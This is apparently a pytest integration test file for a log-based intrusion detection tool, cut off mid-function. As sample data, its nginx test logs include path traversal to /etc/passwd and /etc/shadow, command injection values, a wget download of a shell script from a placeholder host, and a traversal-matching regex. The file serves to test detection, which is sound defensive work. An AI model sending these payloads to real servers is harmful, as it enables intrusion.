"""Integration tests for main functionality."""

import json
import logging
import tempfile
from datetime import datetime, timezone
from pathlib import Path

import pytest

from traxerax_lite.config import load_config, load_report_settings
from traxerax_lite.host_models import AuditFinding, HostStateRecord, RunRecord
from traxerax_lite.models import Event
from traxerax_lite.main import (
    _collect_normalized_events,
    _normalize_kernel_events,
    main,
)
from traxerax_lite.parser import parse_auth_line
from traxerax_lite.report_queries import build_ip_report
from traxerax_lite.storage import (
    get_connection,
    initialize_database,
    insert_audit_finding,
    insert_event,
    insert_host_state_record,
    insert_run_record,
)


def test_main_processing_with_sample_logs(capsys):
    """Test end-to-end processing with inline auth log data."""
    with tempfile.TemporaryDirectory() as tmpdir:
        db_path = Path(tmpdir) / "test.db"
        config_path = Path(tmpdir) / "config.yaml"
        auth_log = Path(tmpdir) / "auth.log"

        config_path.write_text("""
nginx:
  suspicious_paths:
    - "/wp-login.php"
""")
        auth_log.write_text(
            "Mar 25 10:00:01 debian sshd[2001]: Failed password for invalid user admin from 185.10.10.1 port 40001 ssh2\n"
            "Mar 25 10:00:05 debian sshd[2002]: Failed password for root from 185.10.10.1 port 40002 ssh2\n"
            "Mar 25 10:00:07 debian sshd[2003]: Failed password for invalid user test from 185.10.10.1 port 40003 ssh2\n"
            "Mar 25 10:01:20 debian sshd[2005]: Accepted publickey for user1 from 203.0.113.77 port 50001 ssh2\n"
        )

        import sys
        original_argv = sys.argv
        try:
            sys.argv = [
                "main.py",
                "--config", str(config_path),
                "--db-path", str(db_path),
                "--auth-log", str(auth_log),
                "--year", "2026",
                "--json",
            ]
            main()
        finally:
            sys.argv = original_argv

        conn = get_connection(str(db_path))
        events = conn.execute("SELECT COUNT(*) FROM events").fetchone()[0]
        findings = conn.execute("SELECT COUNT(*) FROM findings").fetchone()[0]
        conn.close()

        assert events > 0
        assert findings >= 0


def test_main_ingestion_only_prints_summary(caplog) -> None:
    """Ingestion runs should not print each parsed event or finding."""
    with tempfile.TemporaryDirectory() as tmpdir:
        db_path = Path(tmpdir) / "test.db"
        auth_log = Path(tmpdir) / "auth.log"

        auth_log.write_text(
            "\n".join(
                [
                    (
                        "Mar 25 10:00:01 debian sshd[2001]: Failed password for "
                        "invalid user admin from 185.10.10.1 port 40001 ssh2"
                    ),
                    (
                        "Mar 25 10:00:02 debian sshd[2002]: Failed password for "
                        "invalid user test from 185.10.10.1 port 40002 ssh2"
                    ),
                    (
                        "Mar 25 10:00:03 debian sshd[2003]: Failed password for "
                        "invalid user guest from 185.10.10.1 port 40003 ssh2"
                    ),
                ]
            )
            + "\n"
        )

        import sys

        original_argv = sys.argv
        try:
            caplog.set_level("INFO")
            sys.argv = [
                "main.py",
                "--db-path",
                str(db_path),
                "--auth-log",
                str(auth_log),
                "--year",
                "2026",
                "--json",
            ]
            main()
        finally:
            sys.argv = original_argv

        combined_output = "\n".join(
            record.getMessage() for record in caplog.records
        )

        assert "parsed_events=3" in combined_output
        assert "generated_findings=1" in combined_output
        assert '"event_type"' not in combined_output
        assert '"finding_type"' not in combined_output


def test_main_processes_sources_in_timestamp_order() -> None:
    """Cross-source detections should use event timestamps, not file order."""
    with tempfile.TemporaryDirectory() as tmpdir:
        db_path = Path(tmpdir) / "test.db"
        config_path = Path(tmpdir) / "config.yaml"
        fail2ban_log = Path(tmpdir) / "fail2ban.log"
        nginx_log = Path(tmpdir) / "nginx.log"

        config_path.write_text(
            """
nginx:
  suspicious_paths:
    - "/xmlrpc.php"
"""
        )
        fail2ban_log.write_text(
            "2026-03-25 10:00:01,000 fail2ban.actions        [3001]: NOTICE  [nginx-badbots] Ban 185.10.10.1\n"
        )
        nginx_log.write_text(
            '185.10.10.1 - - [25/Mar/2026:10:00:02 -0700] "GET /xmlrpc.php HTTP/1.1" 404 144 "-" "Mozilla/5.0"\n'
        )

        import sys

        original_argv = sys.argv
        try:
            sys.argv = [
                "main.py",
                "--config",
                str(config_path),
                "--db-path",
                str(db_path),
                "--fail2ban-log",
                str(fail2ban_log),
                "--nginx-log",
                str(nginx_log),
            ]
            main()
        finally:
            sys.argv = original_argv

        conn = get_connection(str(db_path))
        findings = conn.execute(
            """
            SELECT finding_type
            FROM findings
            ORDER BY timestamp ASC, id ASC
            """
        ).fetchall()
        conn.close()

        finding_types = {row[0] for row in findings}
        assert "web_probe_followed_by_fail2ban_ban" not in finding_types


def test_main_uses_detection_thresholds_and_severities_from_config() -> None:
    """Configured detection settings should affect persisted findings."""
    with tempfile.TemporaryDirectory() as tmpdir:
        db_path = Path(tmpdir) / "test.db"
        config_path = Path(tmpdir) / "config.yaml"
        auth_log = Path(tmpdir) / "auth.log"

        config_path.write_text(
            """
detection:
  thresholds:
    auth_failed_login: 2
  severities:
    repeated_failed_login: low
nginx:
  suspicious_paths:
    - "/wp-login.php"
"""
        )
        auth_log.write_text(
            "\n".join(
                [
                    (
                        "Mar 25 10:00:01 debian sshd[2001]: Failed password for "
                        "invalid user admin from 185.10.10.1 port 40001 ssh2"
                    ),
                    (
                        "Mar 25 10:00:02 debian sshd[2002]: Failed password for "
                        "invalid user test from 185.10.10.1 port 40002 ssh2"
                    ),
                ]
            )
            + "\n"
        )

        import sys

        original_argv = sys.argv
        try:
            sys.argv = [
                "main.py",
                "--config",
                str(config_path),
                "--db-path",
                str(db_path),
                "--auth-log",
                str(auth_log),
                "--year",
                "2026",
            ]
            main()
        finally:
            sys.argv = original_argv

        conn = get_connection(str(db_path))
        finding = conn.execute(
            """
            SELECT finding_type, severity
            FROM findings
            WHERE finding_type = 'repeated_failed_login'
            """
        ).fetchone()
        conn.close()

        assert finding is not None
        assert finding[1] == "low"


def test_main_suppresses_configured_baseline_ip() -> None:
    """Configured baseline IPs should be excluded from stored telemetry."""
    with tempfile.TemporaryDirectory() as tmpdir:
        db_path = Path(tmpdir) / "test.db"
        config_path = Path(tmpdir) / "config.yaml"
        auth_log = Path(tmpdir) / "auth.log"

        config_path.write_text(
            """
baseline:
  ignored_source_ips:
    - "185.10.10.1"
"""
        )
        auth_log.write_text(
            (
                "Mar 25 10:00:01 debian sshd[2001]: Failed password for "
                "invalid user admin from 185.10.10.1 port 40001 ssh2\n"
            )
        )

        import sys

        original_argv = sys.argv
        try:
            sys.argv = [
                "main.py",
                "--config",
                str(config_path),
                "--db-path",
                str(db_path),
                "--auth-log",
                str(auth_log),
                "--year",
                "2026",
            ]
            main()
        finally:
            sys.argv = original_argv

        conn = get_connection(str(db_path))
        event_count = conn.execute(
            "SELECT COUNT(*) AS count FROM events"
        ).fetchone()[0]
        conn.close()

        assert event_count == 0


def test_main_uses_mail_password_spray_threshold_and_severity_from_config() -> None:
    """Configured mail spray settings should affect persisted findings."""
    with tempfile.TemporaryDirectory() as tmpdir:
        db_path = Path(tmpdir) / "test.db"
        config_path = Path(tmpdir) / "config.yaml"
        mail_log = Path(tmpdir) / "mail.log"

        config_path.write_text(
            """
detection:
  thresholds:
    mail_unique_usernames: 2
    mail_spray_min_total_failures: 2
  severities:
    mail_password_spray_attempt: critical
nginx:
  suspicious_paths:
    - "/wp-login.php"
"""
        )
        mail_log.write_text(
            "\n".join(
                [
                    (
                        "Mar 25 10:11:40 debian dovecot: imap-login: "
                        "Disconnected (auth failed, 1 attempts in 2 secs): "
                        "user=<alice>, method=PLAIN, rip=198.51.100.20, "
                        "lip=203.0.113.10, TLS, session=<abc123>"
                    ),
                    (
                        "Mar 25 10:11:50 debian dovecot: imap-login: "
                        "Disconnected (auth failed, 1 attempts in 2 secs): "
                        "user=<bob>, method=PLAIN, rip=198.51.100.20, "
                        "lip=203.0.113.10, TLS, session=<abc124>"
                    ),
                ]
            )
            + "\n"
        )

        import sys

        original_argv = sys.argv
        try:
            sys.argv = [
                "main.py",
                "--config",
                str(config_path),
                "--db-path",
                str(db_path),
                "--mail-log",
                str(mail_log),
                "--year",
                "2026",
            ]
            main()
        finally:
            sys.argv = original_argv

        conn = get_connection(str(db_path))
        finding = conn.execute(
            """
            SELECT finding_type, severity
            FROM findings
            WHERE finding_type = 'mail_password_spray_attempt'
            """
        ).fetchone()
        conn.close()

        assert finding is not None
        assert finding[1] == "critical"


def test_main_processing_with_sample_mail_log_demonstrates_mail_findings() -> None:
    """Inline mail log should exercise the key mail security detections."""
    with tempfile.TemporaryDirectory() as tmpdir:
        db_path = Path(tmpdir) / "test.db"
        mail_log = Path(tmpdir) / "mail.log"

        # 5 failures across 3 unique users satisfies spray (unique>=3, total>=5)
        # and repeated_mail_auth_failures (total>=3).
        # The success after those failures satisfies mail_success_after_failures (prior>=2).
        mail_log.write_text(
            "Mar 25 10:11:40 debian dovecot: imap-login: Disconnected (auth failed, 1 attempts in 2 secs): user=<alice>, method=PLAIN, rip=198.51.100.20, lip=203.0.113.10, TLS, session=<s1>\n"
            "Mar 25 10:11:45 debian dovecot: imap-login: Disconnected (auth failed, 1 attempts in 1 secs): user=<bob>, method=PLAIN, rip=198.51.100.20, lip=203.0.113.10, TLS, session=<s2>\n"
            "Mar 25 10:11:50 debian dovecot: imap-login: Disconnected (auth failed, 1 attempts in 1 secs): user=<carol>, method=PLAIN, rip=198.51.100.20, lip=203.0.113.10, TLS, session=<s3>\n"
            "Mar 25 10:11:55 debian dovecot: imap-login: Disconnected (auth failed, 1 attempts in 1 secs): user=<alice>, method=PLAIN, rip=198.51.100.20, lip=203.0.113.10, TLS, session=<s4>\n"
            "Mar 25 10:12:00 debian dovecot: imap-login: Disconnected (auth failed, 1 attempts in 1 secs): user=<bob>, method=PLAIN, rip=198.51.100.20, lip=203.0.113.10, TLS, session=<s5>\n"
            "Mar 25 10:30:00 debian dovecot: imap-login: Login: user=<alice>, method=PLAIN, rip=198.51.100.20, lip=203.0.113.10, mpid=4201, TLS, session=<s6>\n"
        )

        import sys

        original_argv = sys.argv
        try:
            sys.argv = [
                "main.py",
                "--db-path",
                str(db_path),
                "--mail-log",
                str(mail_log),
                "--year",
                "2026",
            ]
            main()
        finally:
            sys.argv = original_argv

        conn = get_connection(str(db_path))
        rows = conn.execute(
            """
            SELECT finding_type
            FROM findings
            ORDER BY timestamp ASC, id ASC
            """
        ).fetchall()
        conn.close()

        finding_types = {row[0] for row in rows}
        assert "repeated_mail_auth_failures" in finding_types
        assert "mail_password_spray_attempt" in finding_types
        assert "mail_success_after_failures" in finding_types


def test_reporting_settings_loaded_from_config_affect_ip_report() -> None:
    """Loaded reporting settings should affect generated IP report output."""
    with tempfile.TemporaryDirectory() as tmpdir:
        db_path = Path(tmpdir) / "test.db"
        config_path = Path(tmpdir) / "config.yaml"

        config_path.write_text(
            """
reporting:
  persistence:
    repeat_banned_min_bans: 1
nginx:
  suspicious_paths:
    - "/wp-login.php"
"""
        )

        conn = get_connection(str(db_path))
        initialize_database(conn)
        insert_event(
            conn,
            Event(
                timestamp=datetime(2026, 3, 25, 10, 0, 1),
                source="auth",
                event_type="ssh_failed_login",
                raw="auth1",
                src_ip="185.10.10.1",
                service="ssh",
                process="sshd",
            ),
        )
        insert_event(
            conn,
            Event(
                timestamp=datetime(2026, 3, 25, 10, 1, 1),
                source="fail2ban",
                event_type="fail2ban_ban",
                raw="ban1",
                src_ip="185.10.10.1",
                service="sshd",
                process="fail2ban",
                action="ban",
                jail="actions",
            ),
        )
        conn.close()

        settings = load_report_settings(load_config(str(config_path)))

        conn = get_connection(str(db_path))
        report = build_ip_report(conn, "185.10.10.1", settings)
        conn.close()

        assert "repeat_banned: yes" in report


def test_main_marks_regex_suspicious_nginx_request_from_config() -> None:
    """Regex-configured nginx patterns should produce suspicious events."""
    with tempfile.TemporaryDirectory() as tmpdir:
        db_path = Path(tmpdir) / "test.db"
        config_path = Path(tmpdir) / "config.yaml"
        nginx_log = Path(tmpdir) / "nginx.log"

        config_path.write_text(
            """
nginx:
  suspicious_paths:
    - "/wp-login.php"
  suspicious_path_patterns:
    - '(?:^|/)\\.\\.(?:/|%2f|%252f|\\\\)'
"""
        )
        nginx_log.write_text(
            '185.10.10.1 - - [25/Mar/2026:10:00:02 +0000] "GET /../../etc/passwd HTTP/1.1" 404 144 "-" "Mozilla/5.0"\n'
        )

        import sys

        original_argv = sys.argv
        try:
            sys.argv = [
                "main.py",
                "--config",
                str(config_path),
                "--db-path",
                str(db_path),
                "--nginx-log",
                str(nginx_log),
            ]
            main()
        finally:
            sys.argv = original_argv

        conn = get_connection(str(db_path))
        event = conn.execute(
            """
            SELECT event_type, path
            FROM events
            ORDER BY timestamp ASC, id ASC
            """
        ).fetchone()
        conn.close()

        assert event is not None
        assert event[0] == "nginx_suspicious_request"
        assert event[1] == "/../../etc/passwd"


def test_main_sample_nginx_log_catches_regex_driven_probes() -> None:
    """Inline nginx log should exercise regex-based suspicious path matching."""
    with tempfile.TemporaryDirectory() as tmpdir:
        db_path = Path(tmpdir) / "test.db"
        nginx_log = Path(tmpdir) / "access.log"

        ip = "203.0.113.200"
        ua = "Mozilla/5.0"
        nginx_log.write_text(
            f'{ip} - - [25/Mar/2026:10:32:41 +0000] "GET /../../etc/passwd HTTP/1.1" 400 88 "-" "{ua}"\n'
            f'{ip} - - [25/Mar/2026:10:32:42 +0000] "GET /%2e%2e/%2e%2e/%2e%2e/etc/shadow HTTP/1.1" 400 88 "-" "{ua}"\n'
            f'{ip} - - [25/Mar/2026:10:32:43 +0000] "GET /cgi-bin/status?cmd=%24%28id%29 HTTP/1.1" 403 88 "-" "{ua}"\n'
            f'{ip} - - [25/Mar/2026:10:32:44 +0000] "GET /index.php?exec=%60uname%60 HTTP/1.1" 403 88 "-" "{ua}"\n'
            f'{ip} - - [25/Mar/2026:10:32:45 +0000] "GET /search?q=1;wget${"{IFS}"}http://198.51.100.9/p.sh HTTP/1.1" 403 88 "-" "{ua}"\n'
            f'{ip} - - [25/Mar/2026:10:32:46 +0000] "GET /download?file=backup.tar.gz%00.php HTTP/1.1" 403 88 "-" "{ua}"\n'
            f'{ip} - - [25/Mar/2026:10:32:47 +0000] "GET /db/backup-2026-03-25.sql HTTP/1.1" 403 88 "-" "{ua}"\n'
        )

        import sys

        original_argv = sys.argv
        try:
            sys.argv = [
                "main.py",
                "--db-path",
                str(db_path),
                "--nginx-log",
                str(nginx_log),
            ]
            main()
        finally:
            sys.argv = original_argv

        conn = get_connection(str(db_path))
        rows = conn.execute(
            """
            SELECT path
            FROM events
            WHERE event_type = 'nginx_suspicious_request'
              AND src_ip = '203.0.113.200'
            ORDER BY timestamp ASC, id ASC
            """
        ).fetchall()
        conn.close()

        suspicious_paths = {row[0] for row in rows}
        assert "/../../etc/passwd" in suspicious_paths
        assert "/%2e%2e/%2e%2e/%2e%2e/etc/shadow" in suspicious_paths
        assert "/cgi-bin/status?cmd=%24%28id%29" in suspicious_paths
        assert "/index.php?exec=%60uname%60" in suspicious_paths
        assert "/search?q=1;wget${IFS}http://198.51.100.9/p.sh" in suspicious_paths
        assert "/download?file=backup.tar.gz%00.php" in suspicious_paths
        assert "/db/backup-2026-03-25.sql" in suspicious_paths


def test_second_run_on_same_log_does_not_duplicate_findings() -> None:
    """Re-processing the same log file should not create duplicate findings."""
    with tempfile.TemporaryDirectory() as tmpdir:
        db_path = Path(tmpdir) / "test.db"
        auth_log = Path(tmpdir) / "auth.log"

        auth_log.write_text(
            "Mar 25 10:00:01 debian sshd[2001]: Failed password for invalid user admin from 185.10.10.1 port 40001 ssh2\n"
            "Mar 25 10:00:02 debian sshd[2002]: Failed password for invalid user test from 185.10.10.1 port 40002 ssh2\n"
            "Mar 25 10:00:03 debian sshd[2003]: Failed password for invalid user guest from 185.10.10.1 port 40003 ssh2\n"
        )

        import sys
        original_argv = sys.argv

        def run():
            sys.argv = [
                "main.py",
                "--db-path", str(db_path),
                "--auth-log", str(auth_log),
                "--year", "2026",
            ]
            main()

        try:
            run()
            run()
        finally:
            sys.argv = original_argv

        conn = get_connection(str(db_path))
        finding_count = conn.execute("SELECT COUNT(*) FROM findings").fetchone()[0]
        event_count = conn.execute("SELECT COUNT(*) FROM events").fetchone()[0]
        conn.close()

        assert event_count == 3
        assert finding_count == 1


def test_since_filter_excludes_old_events() -> None:
    """--since should skip events whose timestamps fall before the cutoff.

    Nginx log lines are used here because they carry an explicit UTC offset
    (+0000), which makes the naive-UTC stored timestamp predictable regardless
    of the test host's local timezone.
    """
    with tempfile.TemporaryDirectory() as tmpdir:
        db_path = Path(tmpdir) / "test.db"
        nginx_log = Path(tmpdir) / "access.log"

        nginx_log.write_text(
            '10.0.0.1 - - [25/Mar/2026:09:00:00 +0000] "GET / HTTP/1.1" 200 100 "-" "agent"\n'
            '10.0.0.2 - - [25/Mar/2026:10:00:00 +0000] "GET / HTTP/1.1" 200 100 "-" "agent"\n'
            '10.0.0.3 - - [25/Mar/2026:11:00:00 +0000] "GET / HTTP/1.1" 200 100 "-" "agent"\n'
        )

        import sys
        original_argv = sys.argv
        try:
            sys.argv = [
                "main.py",
                "--db-path", str(db_path),
                "--nginx-log", str(nginx_log),
                "--since", "2026-03-25T10:00:00",
            ]
            main()
        finally:
            sys.argv = original_argv

        conn = get_connection(str(db_path))
        ips = {
            row[0]
            for row in conn.execute("SELECT DISTINCT src_ip FROM events").fetchall()
        }
        conn.close()

        assert "10.0.0.1" not in ips
        assert "10.0.0.2" in ips
        assert "10.0.0.3" in ips


def test_main_audit_mode_runs_and_persists_findings(capsys):
    """Audit mode should produce output and persist audit findings."""
    with tempfile.TemporaryDirectory() as tmpdir:
        db_path = Path(tmpdir) / "test.db"
        config_path = Path(tmpdir) / "config.yaml"

        config_path.write_text("""
alerts:
  enabled: false
""")

        import sys
        original_argv = sys.argv
        try:
            sys.argv = [
                "main.py",
                "--config", str(config_path),
                "--db-path", str(db_path),
                "--audit",
                "--format", "json",
            ]
            main()
        finally:
            sys.argv = original_argv

        conn = get_connection(str(db_path))
        runs = conn.execute("SELECT COUNT(*) FROM runs").fetchone()[0]
        audit = conn.execute("SELECT COUNT(*) FROM audit_findings").fetchone()[0]
        host_state = conn.execute(
            "SELECT COUNT(*) FROM host_state_records"
        ).fetchone()[0]
        conn.close()

        assert runs >= 1
        assert host_state >= 1
        # Audit findings depend on the host configuration; just ensure the
        # pipeline executed.
        assert audit >= 0


def test_main_monitor_mode_persists_host_state():
    """Monitor mode should persist host state records."""
    with tempfile.TemporaryDirectory() as tmpdir:
        db_path = Path(tmpdir) / "test.db"

        import sys
        original_argv = sys.argv
        try:
            sys.argv = [
                "main.py",
                "--db-path", str(db_path),
                "--monitor",
            ]
            main()
        finally:
            sys.argv = original_argv

        conn = get_connection(str(db_path))
        host_state = conn.execute(
            "SELECT COUNT(*) FROM host_state_records"
        ).fetchone()[0]
        conn.close()

        assert host_state >= 1


def test_main_integrity_baseline_and_scan_detect_change():
    """Integrity baseline + scan should detect a modified file."""
    with tempfile.TemporaryDirectory() as tmpdir:
        db_path = Path(tmpdir) / "test.db"
        target = Path(tmpdir) / "target.txt"
        config_path = Path(tmpdir) / "config.yaml"

        target.write_text("original\n")
        config_path.write_text(
            f"""
integrity:
  monitored_paths:
    - {target}
  monitored_directories: []
alerts:
  enabled: false
"""
        )

        import sys
        original_argv = sys.argv
        try:
            sys.argv = [
                "main.py",
                "--config", str(config_path),
                "--db-path", str(db_path),
                "--integrity-baseline",
            ]
            main()

            target.write_text("modified\n")

            sys.argv = [
                "main.py",
                "--config", str(config_path),
                "--db-path", str(db_path),
                "--integrity-scan",
            ]
            main()
        finally:
            sys.argv = original_argv

        conn = get_connection(str(db_path))
        findings = conn.execute(
            "SELECT finding_type FROM integrity_findings"
        ).fetchall()
        conn.close()

        assert any(row[0] == "changed" for row in findings)


def test_main_rootkit_scan_reports_limited_visibility():
    """Rootkit scan without eBPF should report limited kernel visibility."""
    with tempfile.TemporaryDirectory() as tmpdir:
        db_path = Path(tmpdir) / "test.db"
        config_path = Path(tmpdir) / "config.yaml"

        config_path.write_text("""
alerts:
  enabled: false
""")

        import sys
        original_argv = sys.argv
        try:
            sys.argv = [
                "main.py",
                "--config", str(config_path),
                "--db-path", str(db_path),
                "--rootkit-scan",
                "--kernel-duration", "1",
                "--format", "json",
            ]
            main()
        finally:
            sys.argv = original_argv

        conn = get_connection(str(db_path))
        rootkit = conn.execute(
            "SELECT finding_type FROM rootkit_findings"
        ).fetchall()
        conn.close()

        assert any(
            row[0] == "kernel_visibility_limited" for row in rootkit
        )


def test_main_status_mode_reports_empty_database(caplog) -> None:
    """--status on a fresh database should report that no runs exist."""
    with tempfile.TemporaryDirectory() as tmpdir:
        db_path = Path(tmpdir) / "test.db"

        import sys
        original_argv = sys.argv
        try:
            caplog.set_level("INFO")
            sys.argv = [
                "main.py",
                "--db-path", str(db_path),
                "--status",
            ]
            main()
        finally:
            sys.argv = original_argv

        combined_output = "\n".join(
            record.getMessage() for record in caplog.records
        )

        assert "none recorded yet" in combined_output
        assert "review drops:" in combined_output


def _seed_status_db(db_path: Path) -> None:
    """Seed a database with one run and one audit finding."""
    conn = get_connection(str(db_path))
    initialize_database(conn)
    insert_run_record(
        conn,
        RunRecord(
            run_id="run-status-1",
            timestamp=datetime.now(timezone.utc),
            mode="daemon",
            user="test",
            uid=1000,
            gid=1000,
            is_root=False,
            kernel_probe_attached=False,
            kernel_probe_reason="no loader",
            skipped_sources=["cron: permission denied"],
        ),
    )
    insert_audit_finding(
        conn,
        AuditFinding(
            run_id="run-status-1",
            timestamp=datetime.now(timezone.utc),
            check_id="passwordless_sudo",
            severity="high",
            message="Passwordless sudo entry found",
            resource="/etc/sudoers",
            remediation="remove it",
            confidence=0.9,
        ),
    )
    conn.close()


def test_main_status_mode_reports_seeded_run_text(caplog) -> None:
    """--status should show the last run, finding totals, and recent findings."""
    with tempfile.TemporaryDirectory() as tmpdir:
        db_path = Path(tmpdir) / "test.db"
        _seed_status_db(db_path)

        import sys
        original_argv = sys.argv
        try:
            caplog.set_level("INFO")
            sys.argv = [
                "main.py",
                "--db-path", str(db_path),
                "--status",
            ]
            main()
        finally:
            sys.argv = original_argv

        combined_output = "\n".join(
            record.getMessage() for record in caplog.records
        )

        assert "mode=daemon" in combined_output
        assert "ago" in combined_output
        assert "[HIGH]" in combined_output
        assert "Passwordless sudo entry found" in combined_output
        assert "cron: permission denied" in combined_output


def test_main_status_mode_reports_seeded_run_json(caplog) -> None:
    """--status --json should emit parseable, unstyled JSON."""
    with tempfile.TemporaryDirectory() as tmpdir:
        db_path = Path(tmpdir) / "test.db"
        _seed_status_db(db_path)

        import sys
        original_argv = sys.argv
        try:
            caplog.set_level("INFO")
            sys.argv = [
                "main.py",
                "--db-path", str(db_path),
                "--status",
                "--json",
            ]
            main()
        finally:
            sys.argv = original_argv

        payload = None
        for record in caplog.records:
            message = record.getMessage()
            if message.startswith("{"):
                payload = json.loads(message)

        assert payload is not None
        assert payload["latest_run"]["mode"] == "daemon"
        assert payload["latest_run"]["run_id"] == "run-status-1"
        assert payload["latest_run"]["skipped_sources"] == [
            "cron: permission denied"
        ]
        assert payload["finding_counts"]["audit_findings"] == {"high": 1}
        assert payload["recent_findings"][0]["kind"] == "audit"
        assert "review_drops" in payload


def test_daemon_tick_feeds_kernel_events_to_rootkit_detection(monkeypatch) -> None:
    """Daemon tick should pass drained kernel events to rootkit detection."""
    with tempfile.TemporaryDirectory() as tmpdir:
        db_path = Path(tmpdir) / "test.db"
        config_path = Path(tmpdir) / "config.yaml"

        config_path.write_text("""
daemon:
  interval_seconds: 2
  run_audit: false
  run_integrity_scan: false
  quiet_when_clean: false
alerts:
  enabled: false
""")

        class _StubLoader:
            def __init__(self, settings, build_if_missing=False):
                self._attach_reason = "stubbed"

            def start(self, timeout_seconds=5.0):
                return True

            def stop(self):
                pass

            def drain(self):
                return [
                    {
                        "event_type": "kernel_module_load",
                        "pid": 4321,
                        "tgid": 4321,
                        "comm": "insmod",
                        "uid": 0,
                        "ppid": 1,
                        "parent_comm": "bash",
                        "data": "evilmod",
                    }
                ]

        class _StubScheduler:
            def __init__(self, settings):
                self.settings = settings

            def run(self, callback, initial_run=True):
                callback()

        monkeypatch.setattr("traxerax_lite.main.EBPFLoader", _StubLoader)
        monkeypatch.setattr("traxerax_lite.main.Scheduler", _StubScheduler)
        monkeypatch.setattr("time.sleep", lambda seconds: None)

        import sys
        original_argv = sys.argv
        try:
            sys.argv = [
                "main.py",
                "--config", str(config_path),
                "--db-path", str(db_path),
                "--daemon",
                "--format", "json",
            ]
            main()
        finally:
            sys.argv = original_argv

        conn = get_connection(str(db_path))
        rootkit = conn.execute(
            "SELECT finding_type FROM rootkit_findings"
        ).fetchall()
        conn.close()

        finding_types = {row[0] for row in rootkit}
        assert "kernel_module_loaded" in finding_types


def test_main_audit_mode_host_state_run_id_matches_runs():
    """Audit mode host state records should join to the persisted run."""
    with tempfile.TemporaryDirectory() as tmpdir:
        db_path = Path(tmpdir) / "test.db"
        config_path = Path(tmpdir) / "config.yaml"

        config_path.write_text("""
alerts:
  enabled: false
""")

        import sys
        original_argv = sys.argv
        try:
            sys.argv = [
                "main.py",
                "--config", str(config_path),
                "--db-path", str(db_path),
                "--audit",
                "--format", "json",
            ]
            main()
        finally:
            sys.argv = original_argv

        conn = get_connection(str(db_path))
        run_ids = {
            row[0] for row in conn.execute("SELECT run_id FROM runs").fetchall()
        }
        host_run_ids = {
            row[0]
            for row in conn.execute(
                "SELECT DISTINCT run_id FROM host_state_records"
            ).fetchall()
        }
        conn.close()

        assert host_run_ids
        assert host_run_ids <= run_ids


def test_main_full_mode_flags_new_authorized_keys_after_baseline(monkeypatch):
    """Full mode after a seeded baseline should flag a new authorized_keys file."""
    with tempfile.TemporaryDirectory() as tmpdir:
        db_path = Path(tmpdir) / "test.db"
        config_path = Path(tmpdir) / "config.yaml"

        config_path.write_text("""
alerts:
  enabled: false
""")

        timestamp = datetime.now(timezone.utc)
        baseline_record = HostStateRecord(
            run_id="baseline-run",
            timestamp=timestamp,
            source="authorized_keys",
            record_type="ssh_authorized_keys",
            data={
                "user": "root",
                "uid": 0,
                "path": "/root/.ssh/authorized_keys",
                "key_count": 1,
                "permissions": "600",
                "content": "ssh-ed25519 AAAA baseline\n",
            },
        )
        new_record = HostStateRecord(
            run_id="current-run",
            timestamp=timestamp,
            source="authorized_keys",
            record_type="ssh_authorized_keys",
            data={
                "user": "alice",
                "uid": 1000,
                "path": "/home/alice/.ssh/authorized_keys",
                "key_count": 1,
                "permissions": "600",
                "content": "ssh-ed25519 AAAA attacker\n",
            },
        )

        conn = get_connection(str(db_path))
        initialize_database(conn)
        insert_host_state_record(conn, baseline_record)
        conn.close()

        class _StubLoader:
            def __init__(self, settings, build_if_missing=False):
                self._attach_reason = "stubbed"

            def start(self, timeout_seconds=5.0):
                return True

            def stop(self):
                pass

            def drain(self):
                return []

        monkeypatch.setattr("traxerax_lite.main.EBPFLoader", _StubLoader)
        monkeypatch.setattr(
            "traxerax_lite.main.collect_host_state",
            lambda settings, run_id, ts: ([baseline_record, new_record], []),
        )
        monkeypatch.setattr("time.sleep", lambda seconds: None)

        import sys
        original_argv = sys.argv
        try:
            sys.argv = [
                "main.py",
                "--config", str(config_path),
                "--db-path", str(db_path),
                "--kernel-duration", "1",
                "--format", "json",
            ]
            main()
        finally:
            sys.argv = original_argv

        conn = get_connection(str(db_path))
        rows = conn.execute(
            """
            SELECT finding_type, severity
            FROM rootkit_findings
            WHERE finding_type = 'host_change_new_authorized_keys'
            """
        ).fetchall()
        conn.close()

        assert rows
        assert rows[0][1] == "high"


def test_main_second_identical_run_produces_no_alerts_or_drops(monkeypatch, tmp_path):
    """A repeat run with identical findings must not re-alert or drop again."""
    db_path = tmp_path / "test.db"
    drop_dir = tmp_path / "drops"
    config_path = tmp_path / "config.yaml"
    config_path.write_text(f"""
alerts:
  enabled: true
  min_severity: medium
  desktop_notify: true
  terminal_warning: true
  drop_dir: "{drop_dir}"
""")

    timestamp = datetime.now(timezone.utc)

    def _fixed_audit_checks(settings, run_id, ts):
        return [
            AuditFinding(
                run_id=run_id,
                timestamp=timestamp,
                check_id="fixed_check",
                severity="high",
                message="fixed finding",
                resource="/etc/fixed",
                remediation="fix it",
                confidence=0.9,
            )
        ]

    notifications: list[str] = []
    monkeypatch.setattr(
        "traxerax_lite.main.run_audit_checks", _fixed_audit_checks
    )
    monkeypatch.setattr(
        "traxerax_lite.main.collect_host_state",
        lambda settings, run_id, ts: ([], []),
    )
    monkeypatch.setattr(
        "traxerax_lite.alerts.send_desktop_notification",
        lambda summary, max_severity, logger: notifications.append(summary)
        or True,
    )

    import sys
    original_argv = sys.argv
    argv = [
        "main.py",
        "--config", str(config_path),
        "--db-path", str(db_path),
        "--audit",
        "--format", "json",
    ]
    try:
        sys.argv = argv
        main()
        first_drops = len(list(drop_dir.glob("run-*.json")))
        sys.argv = list(argv)
        main()
        second_drops = len(list(drop_dir.glob("run-*.json")))
    finally:
        sys.argv = original_argv

    assert first_drops == 1
    assert len(notifications) == 1
    # Second run: the same finding is already in the DB, so nothing new
    # means no new drop and no new notification.
    assert second_drops == 1
    assert len(notifications) == 1


def test_collect_normalized_events_skips_malformed_lines(monkeypatch, caplog):
    """One malformed line must not abort collection of the remaining lines."""

    def _flaky_parse(line, year=None, local_timezone=None):
        if "boom" in line:
            raise ValueError("malformed line")
        return parse_auth_line(line, year=year, local_timezone=local_timezone)

    monkeypatch.setattr("traxerax_lite.main.parse_auth_line", _flaky_parse)
    caplog.set_level(logging.WARNING)

    records = _collect_normalized_events(
        auth_log=None,
        fail2ban_log=None,
        nginx_log=None,
        mail_log=None,
        journald_lines={
            "auth": [
                "Mar 25 10:00:01 debian sshd[2001]: Failed password for "
                "root from 185.10.10.1 port 40002 ssh2",
                "boom",
                "Mar 25 10:00:02 debian sshd[2002]: Failed password for "
                "root from 185.10.10.1 port 40003 ssh2",
            ]
        },
        year=2026,
